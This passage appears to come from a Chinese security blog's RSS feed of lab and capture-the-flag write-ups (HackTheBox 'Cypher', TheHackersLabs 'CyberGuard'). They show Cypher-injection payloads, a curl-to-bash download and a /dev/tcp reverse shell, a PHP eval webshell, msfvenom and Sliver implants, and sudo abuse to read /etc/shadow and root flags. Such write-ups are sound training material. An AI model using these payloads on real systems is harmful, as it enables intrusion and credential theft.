whisper@server:~$ sudo /usr/bin/python3 -c "import os;os.system('/bin/bash -p')"
root@server:/home/whisper# 
```

```bash
root@server:~# cat root.txt 
THL{Zpxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>Mysql</category>
            <category>Python</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Season7 - Cypher]]></title>
            <link>https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher</guid>
            <pubDate>Fri, 04 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season7 Cypher https://app.hackthebox.com/machines/Cypher | Linux · Medium 前期踩点 10.10.11.57 是靶机 发现域名 http://cypher.htb/ 添加到hosts文件 扫描UDP端口 扫描一下子域名 访问H...]]></description>
            <content:encoded><![CDATA[# Season7-Cypher

> https://app.hackthebox.com/machines/Cypher | `Linux · Medium`
> 

## 前期踩点

`10.10.11.57` 是靶机

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -min-rate 10000 -p- 10.10.11.57              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST
Nmap scan report for 10.10.11.57
Host is up (0.13s latency).
Not shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

发现域名 `http://cypher.htb/` 添加到`hosts`文件

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -A -T4 -O -p 22,80 10.10.11.57               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST
Nmap scan report for 10.10.11.57
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   502.38 ms 10.10.16.1
2   586.07 ms 10.10.11.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.03 seconds
```

扫描`UDP`端口

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sU -min-rate 10000 -p- cypher.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (4.6s latency).
Not shown: 65517 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
476/udp   closed tn-tl-fd1
5749/udp  closed unknown
16119/udp closed unknown
16380/udp closed unknown
16424/udp closed unknown
32237/udp closed unknown
33895/udp closed unknown
39619/udp closed unknown
40153/udp closed unknown
42240/udp closed unknown
42704/udp closed unknown
45096/udp closed unknown
53762/udp closed unknown
55811/udp closed unknown
56083/udp closed unknown
59387/udp closed unknown
60627/udp closed unknown
62347/udp closed unknown
```

扫描一下子域名

```bash
⚡ root@kali  ~/Desktop/test/cypher  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host:FUZZ.cypher.htb' -u http://cypher.htb                               

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cypher.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                       
=====================================================================

Total time: 199.7973
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 24.97030
```

访问`HTTP`主页，这个动画效果将我的`Kali`击碎

![image.png](/post-images/HackTheBoxSeason7-Cypher/image27.png)

貌似在登录框存在`SQL`注入，使用`SQLMAP`和手动注入无果

![image.png](/post-images/HackTheBoxSeason7-Cypher/image28.png)

扫描目录

```bash
⚡ root@kali  ~/Desktop/test/cypher  dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt

Target: http://cypher.htb/

[08:33:32] Starting: 
[08:33:56] 200 -    5KB - /about
[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[08:34:17] 307 -    0B  - /api  ->  /api/docs
[08:34:42] 307 -    0B  - /demo  ->  /login
[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo
[08:35:10] 200 -    4KB - /login
[08:35:10] 200 -    4KB - /login.html
[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/
```

发现新目录`testing` ，访问下载了`jar`文件

![image.png](/post-images/HackTheBoxSeason7-Cypher/image29.png)

## 反编译 jar

将`jar`文件下载下来，使用`jd-gui`反编译

![image.png](/post-images/HackTheBoxSeason7-Cypher/image30.png)

在其中发现貌似可以命令执行地方

```bash
String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

丢到`GPT`里进行分析：

- 该 Java 代码是 Neo4j 自定义 APOC（Awesome Procedures on Cypher）扩展的一部分，提供 `custom.getUrlStatusCode` 过程。
- 该过程接收一个 URL，使用 `curl` 命令获取其 HTTP 状态码，并返回。
- **攻击示例执行效果**这会导致服务器泄露敏感文件 `/etc/passwd`。
    
    ```
    CALL custom.getUrlStatusCode("https://example.com; cat /etc/passwd")
    ```
    
    ```
    curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; cat /etc/passwd
    ```
    

## Cypher Injection

看到`neo4j`才发现上面的压根不是`SQL`注入 https://neo4j.com/docs/getting-started/cypher/

> Cypher is Neo4j’s declarative and GQL conformant query language. Available as open source via The openCypher project, Cypher is similar to SQL, but optimized for graphs. | Cypher 是 Neo4j 的声明式和符合 GQL 的查询语言。Cypher 可通过openCypher 项目以开源形式获得，它类似于 SQL，但针对图形进行了优化。
> 

尝试了使用`cyphermap`但是始终返回`Unable to find valid injection type...`

通过 ：https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection 可以了解到`Cypher`注入

随便输入点东西可以在错误中发现查询语句

```bash
{message: Variable `c` not defined (line 1, column 75 (offset: 74))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash"
                                                                           ^}
```

成功闭合

```bash
{"username":"admin' or 1=1 return h.value as hash//","password":"1" }
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image31.png)

带外测试

```bash
{"username":"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//","password":"1" }
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image32.png)

然后可以通过`custom` 用来引用自定义的程序或函数，也就是上面带有命令执行的方法 https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/

成功带外，但是无回显

```bash
{
	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;whoami\") YIELD statusCode AS a RETURN a;//",
	"password":"1" 
}
```

构造`payload`

1. 在kali创建带有反弹shell语句的文件shell.txt（让服务器访问）
    
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/1234 0>&1'
    ```
    
2. 开启监听
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/cypher  nc -lvnp 1234
    listening on [any] 1234 ...
    ```
    
3. 开启简易服务器
4. 构造`payload`
    
    ```bash
    {
    	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\") YIELD statusCode AS a RETURN a;//",
    	"password":"1" 
    }
    ```
    
    成功获得`shell`
    
    ![image.png](/post-images/HackTheBoxSeason7-Cypher/image33.png)
    

## 提权

信息收集一波

```bash
neo4j@cypher:/home/graphasm$ ls -al
total 56
drwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .
drwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..
lrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config
drwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .local
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput
-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt
```

bbot_preset.yml 得到一组账号密码

```bash
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

但是使用`neo4j`登陆不成功，密码碰撞使用`graphasm`登陆成功

```bash
⚡ root@kali  ~/Desktop/test/cypher  ssh graphasm@10.10.11.57                            
graphasm@10.10.11.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar  2 03:13:58 PM UTC 2025

  System load:  0.0               Processes:             243
  Usage of /:   74.2% of 8.50GB   Users logged in:       1
  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Mar 2 15:13:59 2025 from 10.10.16.34
graphasm@cypher:~$ 
```

在家目录下可以读取`UserFlag`

```bash
graphasm@cypher:~$ cat user.txt 
63a155f3be93bac8eec086ec22459b65
```

查看graphasm用户权限

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

查看`bbot`帮助

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot   
  ______  _____   ____ _______               
 |  ___ \|  __ \ / __ \__   __|                                                                                                                                                                                    
 | |___) | |__) | |  | | | |                                                                             
 |  ___ <|  __ <| |  | | | |                  
 | |___) | |__) | |__| | | |                                                                             
 |______/|_____/ \____/  |_|                                                                             
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    
                                                                                                         
www.blacklanternsecurity.com/bbot                                                                        
                                                                                                         
usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]
            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]
            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]
            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]
                                                    
Bighuge BLS OSINT Tool                                                                                   
                                                                                                         
options:                                                                                                 
  -h, --help            show this help message and exit
                                                                                                         
Target:                
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things                                                         
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope                                                                                                                               
                                                                                                         
Presets:                                           
  -p [PRESET ...], --preset [PRESET ...]                                                                 
                        Enable BBOT preset(s)                                                            
  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'    
  -lp, --list-presets   List available presets.     
                                                                                                         
Modules:                                                                                                 
  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  
                        Modules to enable. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre
dshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle
tters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i
is_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get
params,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke
,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             
  -l, --list-modules    List available modules.                                                                                                                                                                    
  -lmo, --list-module-options                                                                            
                        Show all module config options        
  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         
                        Exclude these modules.
  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]
                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,
deadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         
  -lf, --list-flags     List available flags. 
  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   
                        Only enable modules with these flags (e.g. -rf passive)                          
  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   
                        Disable modules with these flags. (e.g. -ef aggressive)                          
  --allow-deadly        Enable the use of highly aggressive modules                                      
                                                                                                         
Scan:                                                                                                                                                                                                              
  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   
                        Name of scan (default: random)                                                                                                                                                             
  -v, --verbose         Be more verbose                                                                                                                                                                            
  -d, --debug           Enable debugging            
  -s, --silent          Be quiet                                                                         
  --force               Run scan even in the case of condition violations or failed module setups        
  -y, --yes             Skip scan confirmation prompt                                                    
  --dry-run             Abort before executing scan                                                      
  --current-preset      Show the current preset in YAML format                                           
  --current-preset-full
                        Show the current preset in its full form, including defaults
                                                    
Output:                                                                                                  
  -o DIR, --output-dir DIR                                                                               
                        Directory to output scan results             
  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          
                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         
  --json, -j            Output scan data in JSON format   
  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            
                        Choose which event types to display                                              
                                                                                                                                                                                                                   
Module dependencies:                                                                                     
  Control how modules install their dependencies    
                                                                                                         
  --no-deps             Don't install module dependencies                                                
  --force-deps          Force install all module dependencies                                            
  --retry-deps          Try again to install failed module dependencies                                                                                                                                            
  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          
  --install-all-deps    Install dependencies for all modules                                                                                                                                                       
                                                                                                                                                                                                                   
Misc:                                                                                                                                                                                                              
  --version             show BBOT version and exit                                                       
  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     
                        List of custom headers as key value pairs (header=value).                        
  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES
                        Add custom yara rules to excavate                                                
                                                    
EXAMPLES                                     
                                                                                                                                                                                                                   
    Subdomains:                                                                                          
        bbot -t evilcorp.com -p subdomain-enum
                                                                                                         
    Subdomains (passive only):                                                                           
        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               
                                                                                                         
    Subdomains + port scan + web screenshots:                                                            
        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     
                                                                                                                                                                                                                   
    Subdomains + basic web scan:                                                                                                                                                                                   
        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           
                                                                                                                                                                                                                   
    Web spider:                                     
        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   
                                                                                                         
    Everything everywhere all at once:                                                                   
        bbot -t evilcorp.com -p kitchen-sink                                                             
                                                                                                         
    List modules:      
        bbot -l                                                                                          
                                                    
    List presets:                                                                                        
        bbot -lp                                                                                         
                                                                                                         
    List flags:                                                                                          
        bbot -lf                                                                                        
```

构造任意文件读取

读取文件大点的文件，容易看见输出

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /etc/shadow -d 
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image34.png)

读取`root.txt`

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d 
```

```bash
63582a9da70699c87d6bd78e92aa9a71
```

![image.png](/post-images/HackTheBoxSeason7-Cypher/image35.png)
]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux靶机</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - CyberGuard]]></title>
            <link>https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard</guid>
            <pubDate>Mon, 28 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[CyberGuard https://labs.thehackerslabs.com/machine/25 一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。 Recon PortScan 枚举 HTTP 服务 目录爆破，这里扫描久了会被 ban 掉 这个 query 和输出结果感觉有股熟...]]></description>
            <content:encoded><![CDATA[
# CyberGuard

> https://labs.thehackerslabs.com/machine/25
> 

![image.png](/post-images/TheHackersLabsCyberGuard/image.png)

一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。

![image.png](/post-images/TheHackersLabsCyberGuard/image1.png)

## Recon

### PortScan

```bash
➜  CyberGuard nmap -sn 10.0.2.0/24                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST
Nmap scan report for 10.0.2.1
Host is up (0.00072s latency).
MAC Address: 0A:00:27:00:00:11 (Unknown)
Nmap scan report for 10.0.2.10
Host is up (0.00047s latency).
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.20
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.21 seconds
```

```bash
➜  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST
Nmap scan report for 10.0.2.10
Host is up (0.0013s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
```

```bash
➜  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST
Nmap scan report for 10.0.2.10
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (application/octet-stream, text/plain; charset=UTF-8).
MAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 11.X (92%)
OS CPE: cpe:/o:freebsd:freebsd:11.2
Aggressive OS guesses: FreeBSD 11.2-RELEASE (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 10.0.2.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
```

### 枚举

`HTTP` 服务

![image.png](/post-images/TheHackersLabsCyberGuard/image2.png)

目录爆破，这里扫描久了会被 ban 掉

```bash
➜  CyberGuard gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/index.php            (Status: 200) [Size: 1048]
/search               (Status: 200) [Size: 2046]
/admin                (Status: 302) [Size: 378] [--> http://10.0.2.10/admin/auth/login]
/up                   (Status: 200) [Size: 2130]
```

这个 `query` 和输出结果感觉有股熟悉的味

![image.png](/post-images/TheHackersLabsCyberGuard/image3.png)

`sqlmap` 跑一波

```bash
sqlmap -r packet -batch --level 3 --risk 3
```

真跑出来了，在 `UA` 中存在注入点

![image.png](/post-images/TheHackersLabsCyberGuard/image4.png)

## SQL Injection

使用 `sqlmap` 直接全给爆出来

```bash
current database: 'cyberguard
current user: 'ian@localhost'

+------------------------+
| cache                  |
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blacklist_user_agents  |
| cache_locks            |
| failed_jobs            |
| job_batches            |
| jobs                   |
| migrations             |
| password_reset_tokens  |
| sessions               |
| users                  |
+------------------------+

# admin_user
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+
| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+
| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+

```

爆破一下密码

```bash
➜  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
killer           (?)     
1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到明文密码 `killer`

## 后台利用

来到网站后台尝试进行登录

成功进入后台

![image.png](/post-images/TheHackersLabsCyberGuard/image5.png)

后台里面有个命令执行的功能（图中的 `shell`）

成功执行命令

![image.png](/post-images/TheHackersLabsCyberGuard/image6.png)

再拿 `/etc/passwd` 的信息，能知道 `ian` 用户是存在的

```bash
ian:x:1000:1000:ian,,,:/home/ian:/bin/bash
```

### 尝试 1 ❌

尝试反弹 `shell` ，这里使用 `nc` 和 `/bin/bash` 都无法弹出来，一直在加载

后台还有一个上传功能点，但是没找到上传的文件夹在哪

![image.png](/post-images/TheHackersLabsCyberGuard/image7.png)

尝试使用命令行来找到上传的文件夹在哪

```bash
find / -name 'result.php' 2>/dev/null
```

通过 find 命令能找到存放在 `/var/www/cyberguard/storage/app/private/result.php`

![image.png](/post-images/TheHackersLabsCyberGuard/image8.png)

再看一下当前目录在哪，在 `/var/www/cyberguard/public`

![image.png](/post-images/TheHackersLabsCyberGuard/image9.png)

我们应该是没有办法切换过去

所以这里尝试直接写入`webshell`

```bash
echo '<?php eval($_POST["x"]);phpinfo();?>' > test.php
```

可以执行命令

![image.png](/post-images/TheHackersLabsCyberGuard/image10.png)

但结果还是无法进行反弹 `shell` ，被阻止

### 尝试 2 ❌

尝试使用 `MSF` 来拿到 `shell`

```bash
➜  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: sunset
```

上传后在命令执行窗口执行如下命令

```bash
chmod +x /var/www/cyberguard/storage/app/private/sunset
/var/www/cyberguard/storage/app/private/sunset
```

这里还尝试很多种`payload` ，例如`cmd/linux/http/x64/meterpreter_reverse_http`  等

但是结果和在 `WebShell` 反弹一样，被阻止了

### 尝试 3 ✅

这里尝试使用 `sliver` 

> https://github.com/BishopFox/sliver
> 

`sliver` 有很高的隐蔽性和免杀性能，并且也支持其他的协议

```bash
➜  CyberGuard sliver
Connecting to localhost:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain persist
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  
```

使用 `WireGuard` 协议生成植入物并监听

```bash
sliver > generate --wg 10.0.2.20 -o linux -a amd64 -f binary

[*] Generated unique ip for wg peer tun interface: 100.64.0.2
[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m12s
[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR

sliver > wg

[*] Starting Wireguard listener ...
[*] Successfully started job #1
```

上传到靶机并运行

```bash
chmod +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR
/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR
```

然后可以在 `sliver` 服务端中看到连接上去了

![image.png](/post-images/TheHackersLabsCyberGuard/image11.png)

和 `MSF` 差不多的操作

![image.png](/post-images/TheHackersLabsCyberGuard/image12.png)

## 内网渗透

### 信息收集

我们查看 `databases.php` 

```bash
'default' => [
            'url' => env('REDIS_URL'),
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'username' => env('REDIS_USERNAME'),
            'password' => env('REDIS_PASSWORD'),
            'port' => env('REDIS_PORT', '6379'),
            'database' => env('REDIS_DB', '0'),
        ],
```

发现数据库凭据存放在环境变量中

```bash
DB_PASSWORD=ZqBHR4MZ<f*+bv(J
REDIS_HOST=127.0.0.1
DB_HOST=127.0.0.1
QUEUE_CONNECTION=database
```

得到一串密码 `ZqBHR4MZ<f*+bv(J`

经过测试我们知道密码是 `ian` 账户的

```bash
[*] Started remote shell with pid 1069

